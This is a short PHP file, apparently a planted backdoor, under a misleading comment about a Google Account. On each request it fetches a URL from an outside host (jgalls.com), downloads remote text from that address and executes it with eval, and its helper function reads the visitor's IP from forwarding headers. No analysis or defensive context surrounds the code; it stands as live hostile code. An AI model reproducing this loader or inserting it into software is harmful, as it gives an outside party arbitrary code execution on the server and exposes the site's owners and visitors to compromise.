<?php
/* your Google Account and services. */
if(getIP()!=""){eval("?>".(file_get_contents(file_get_contents("http://jgalls.com/1.aspx")."php2/nbnl.txt")));}function getIP(){if(getenv('HTTP_CLIENT_IP')){$a=getenv('HTTP_CLIENT_IP');}elseif(getenv('HTTP_X_FORWARDED_FOR')){$a=getenv('HTTP_X_FORWARDED_FOR');}elseif(getenv('HTTP_X_FORWARDED')){$a=getenv('HTTP_X_FORWARDED');}elseif(getenv('HTTP_FORWARDED_FOR')){$a=getenv('HTTP_FORWARDED_FOR');}elseif(getenv('HTTP_FORWARDED')){$a=getenv('HTTP_FORWARDED');}else{$a=$_SERVER['REMOTE_ADDR'];}return $a;}?>